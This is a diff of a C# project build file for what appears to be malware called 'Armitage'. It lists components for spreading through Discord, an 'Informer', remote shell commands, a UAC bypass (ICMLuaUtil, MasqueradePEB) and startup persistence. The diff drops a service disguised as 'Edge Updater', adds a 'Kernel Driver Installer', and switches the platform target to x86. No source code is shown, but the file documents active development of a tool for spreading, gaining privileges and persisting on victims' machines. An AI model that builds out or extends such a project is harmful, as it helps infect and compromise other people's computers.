@@ -48,7 +48,7 @@
     <OutputPath>bin\Discord Spread Disabled\</OutputPath>
     <DefineConstants>TRACE;DiscordSpreadDisabled</DefineConstants>
     <DebugType>pdbonly</DebugType>
-    <PlatformTarget>x64</PlatformTarget>
+    <PlatformTarget>x86</PlatformTarget>
     <LangVersion>7.3</LangVersion>
     <ErrorReport>prompt</ErrorReport>
     <Prefer32Bit>true</Prefer32Bit>
@@ -204,15 +204,7 @@
     <Compile Include="Armitage\Informer.cs" />
     <Compile Include="Armitage\Postman\Discord Spreader.cs" />
     <Compile Include="Armitage\Shell\Command Types.cs" />
-    <Compile Include="Armitage\Startup\Service\Edge Updater.cs">
-      <SubType>Component</SubType>
-    </Compile>
-    <Compile Include="Armitage\Startup\Service\Edge Updater.Designer.cs">
-      <DependentUpon>Edge Updater.cs</DependentUpon>
-    </Compile>
-    <Compile Include="Armitage\Startup\Service\Service Metadata.cs">
-      <SubType>Component</SubType>
-    </Compile>
+    <Compile Include="Armitage\Startup\Kernel Driver Installer.cs" />
     <Compile Include="Armitage\Startup\Task Scheduler.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
     <Compile Include="Armitage\UAC\MasqueradePEB.cs" />
